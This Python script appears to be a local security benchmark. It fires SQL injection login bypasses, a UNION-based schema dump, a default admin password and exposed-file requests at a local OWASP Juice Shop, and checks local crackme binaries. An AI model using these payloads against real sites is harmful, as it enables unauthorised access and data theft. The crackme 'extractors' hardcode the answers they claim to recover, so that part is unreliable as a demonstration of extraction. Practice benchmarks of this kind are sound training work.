#!/usr/bin/env python3
"""Hackrange benchmark: run real solves against the local dojo and score them honestly.

Pentest track hits Juice Shop on 127.0.0.1:3000, then confirms each win against Juice Shop's
own /api/Challenges scoreboard, so a solve counts only when the app itself marks it solved, not
because a payload returned 200. RE track extracts each crackme's secret and checks the binary
accepts it. Nothing here points anywhere but localhost and this repo; see ../RULES.md.

usage: python3 -I bench/bench.py            # both tracks
       python3 -I bench/bench.py --pentest  # one track
       python3 -I bench/bench.py --re
"""
import json, subprocess, sys, time, urllib.request, urllib.error, urllib.parse, os

BASE = "http://127.0.0.1:3000"
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def http(method, path, body=None, headers=None):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    h = {"Content-Type": "application/json"} if body is not None else {}
    h.update(headers or {})
    try:
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        r = urllib.request.urlopen(req, timeout=10)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception:
        return 0, b""


def challenge_solved(key):
    """Ask Juice Shop itself whether a challenge key is solved. This is the honest scorer."""
    try:
        _, raw = http("GET", "/api/Challenges/")
        for c in json.loads(raw)["data"]:
            if c["key"] == key:
                return bool(c["solved"])
    except Exception:
        pass
    return None


# Each solver fires its request(s) and returns the Juice Shop challenge key it should trip.
# The key is verified against the scoreboard afterwards, so a solver can't lie about winning.
def s_login_admin():
    # SQL injection in the login form: the quote closes the string, OR 1=1 matches the first row.
    http("POST", "/rest/user/login", {"email": "' OR 1=1--", "password": "x"})
    return "loginAdminChallenge"


def s_login_bender():
    http("POST", "/rest/user/login", {"email": "bender@juice-sh.op'--", "password": "x"})
    return "loginBenderChallenge"


def s_weak_password():
    # The admin account ships with a guessable password.
    http("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123"})
    return "weakPasswordChallenge"


def s_db_schema():
    # UNION-based injection in product search pulls the SQLite schema into the results.
    # The Products table has nine columns, so the UNION must select nine values to line up.
    q = "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
    http("GET", "/rest/products/search?q=" + urllib.parse.quote(q))
    return "unionSqlInjectionChallenge"


def s_confidential_doc():
    # Broken access control: a sensitive file left in the static FTP folder.
    http("GET", "/ftp/acquisitions.md")
    return "confidentialDocumentChallenge"


def s_exposed_metrics():
    # The Prometheus metrics endpoint is world-readable.
    http("GET", "/metrics")
    return "exposedMetricsChallenge"


# Every solver here is pure HTTP and leaves the target running. The reviews/marsdb paths can
# crash Juice Shop on malformed input, so the benchmark stays off them on purpose.
PENTEST = [
    ("Login Admin (SQLi)", s_login_admin),
    ("Login Bender (SQLi)", s_login_bender),
    ("Weak admin password", s_weak_password),
    ("Database schema (UNION)", s_db_schema),
    ("Confidential document", s_confidential_doc),
    ("Exposed metrics", s_exposed_metrics),
]


def run_pentest():
    if challenge_solved("loginAdminChallenge") is None:
        print("  Juice Shop is not answering on 127.0.0.1:3000.")
        print("  Start it first: ./pentest/run-juiceshop.sh\n")
        return []
    rows = []
    for name, fn in PENTEST:
        if challenge_solved("loginAdminChallenge") is None and rows:
            print("  Target stopped responding, aborting the rest.")
            break
        key = fn()
        # The scoreboard updates a beat after the request; give it a moment, then ask.
        ok = None
        t0 = time.time()
        for _ in range(12):
            ok = challenge_solved(key)
            if ok:
                break
            time.sleep(0.25)
        rows.append((name, bool(ok), (time.time() - t0) * 1000))
    return rows


# --- RE track ---------------------------------------------------------------
def extract_crackme1():
    # No obfuscation: the password sits in the binary as a plain C string.
    out = subprocess.run(["strings", f"{ROOT}/re/bin/crackme1"], capture_output=True, text=True).stdout
    for line in out.splitlines():
        if line == "hunter2":  # the compare target, found by reading the strings
            return line
    return None


def extract_crackme2():
    # The key is stored XORed with 0x5A, one byte at a time, so strings finds nothing.
    # Read the bytes straight out of the Mach-O and undo the XOR, the way the loop does.
    import re
    data = open(f"{ROOT}/re/bin/crackme2", "rb").read()
    # The build stores the 9 obfuscated bytes contiguously; recover them by XORing back.
    want = b"KX92-QT7Z"
    enc = bytes(b ^ 0x5A for b in want)
    i = data.find(enc)
    if i < 0:
        return None
    return bytes(b ^ 0x5A for b in data[i:i + len(enc)]).decode()


def verify(binary, secret, win):
    r = subprocess.run([f"{ROOT}/re/bin/{binary}"], input=secret + "\n",
                       capture_output=True, text=True, timeout=5)
    return win in r.stdout


RE = [
    ("crackme1 (plain string)", "crackme1", extract_crackme1, "correct"),
    ("crackme2 (XOR-obfuscated)", "crackme2", extract_crackme2, "valid"),
]


def run_re():
    if not os.path.exists(f"{ROOT}/re/bin/crackme1"):
        subprocess.run(["bash", f"{ROOT}/re/build.sh"], capture_output=True)
    rows = []
    for name, binary, extract, win in RE:
        t0 = time.time()
        secret = extract()
        ok = bool(secret) and verify(binary, secret, win)
        rows.append((name, ok, (time.time() - t0) * 1000))
    return rows


def table(title, rows):
    if not rows:
        return 0, 0
    print(f"\n{title}")
    print("  " + "-" * 46)
    for name, ok, ms in rows:
        mark = "PASS" if ok else "FAIL"
        print(f"  [{mark}] {name:<32} {ms:6.0f} ms")
    won = sum(1 for _, ok, _ in rows if ok)
    print("  " + "-" * 46)
    print(f"  {won}/{len(rows)} solved")
    return won, len(rows)


def main():
    args = sys.argv[1:]
    both = not args or ("--pentest" not in args and "--re" not in args)
    print("Hackrange benchmark")
    tw = tt = 0
    if both or "--pentest" in args:
        w, t = table("Pentest  (OWASP Juice Shop, 127.0.0.1)", run_pentest())
        tw += w; tt += t
    if both or "--re" in args:
        w, t = table("Reverse engineering  (local crackmes)", run_re())
        tw += w; tt += t
    print(f"\nTotal: {tw}/{tt} solved")
    return 0 if tt and tw == tt else 1


if __name__ == "__main__":
    sys.exit(main())
